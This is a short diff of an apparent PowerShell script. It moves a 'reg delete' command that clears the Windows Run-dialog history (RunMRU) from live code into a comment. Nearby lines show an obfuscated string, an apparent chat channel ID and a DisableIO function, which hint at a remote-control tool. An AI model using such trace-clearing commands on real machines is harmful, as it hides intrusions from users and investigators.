@@ -1,7 +1,6 @@
 
 # =============================================================== SCRIPT SETUP =========================================================================
 
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 $version = "1.5.1" # Check version number
 $response = $null
 $previouscmd = $null
@@ -1022,6 +1021,7 @@ Function DisableIO{
 
 # =============================================================== MAIN FUNCTIONS =========================================================================
 
+# reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 $int3 = '.GYrzck.'
 $ch = '1222180288516329583'
 $chan = "$ch"
